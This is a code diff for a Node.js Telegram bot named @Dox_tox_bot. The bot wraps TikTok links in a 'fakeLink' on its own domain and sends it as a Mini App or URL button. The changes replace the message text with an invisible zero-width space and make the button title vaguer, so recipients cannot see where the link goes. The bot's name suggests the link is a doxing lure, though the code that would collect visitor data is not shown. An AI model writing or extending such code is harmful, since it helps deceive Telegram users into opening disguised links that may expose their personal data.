@@ -15,7 +15,7 @@ app.use(express.urlencoded({ extended: true }));
 
 const linksDB = {};
 
-// --- БОТ: ЛИЧНЫЕ СООБЩЕНИЯ ---
+// --- ЛИЧНЫЕ СООБЩЕНИЯ ---
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok.');
 });
@@ -29,8 +29,8 @@ bot.on('message', (msg) => {
     linksDB[shortId] = text;
     const fakeLink = `${DOMAIN}/${shortId}/`;
     
-    // В личке используем web_app (нативная кнопка Mini App)
-    bot.sendMessage(msg.chat.id, `Ссылка готова!`, {
+    // В личке тоже без текста, только кнопка
+    bot.sendMessage(msg.chat.id, '\u200b', {
       reply_markup: {
         inline_keyboard: [[{ text: 'Открыть', web_app: { url: fakeLink } }]]
       }
@@ -38,7 +38,7 @@ bot.on('message', (msg) => {
   }
 });
 
-// --- БОТ: INLINE РЕЖИМ (@Dox_tox_bot) ---
+// --- INLINE РЕЖИМ (@Dox_tox_bot) ---
 bot.on('inline_query', async (query) => {
   try {
     const text = query.query;
@@ -54,12 +54,12 @@ bot.on('inline_query', async (query) => {
     const result = {
       type: 'article',
       id: shortId,
-      title: 'Открыть видео в TikTok',
-      description: 'Нажмите, чтобы отправить',
+      title: 'Открыть видео',
+      description: 'Нажмите, чтобы отправить кнопку',
       input_message_content: {
-        message_text: appLink // В инлайн-режиме отправляем просто ссылку
+        // Невидимый пробел, чтобы не было длинной ссылки
+        message_text: '\u200b' 
       },
-      // Используем url вместо web_app, чтобы Telegram не выдавал ошибку
       reply_markup: {
         inline_keyboard: [[{ text: 'Открыть', url: appLink }]]
       }
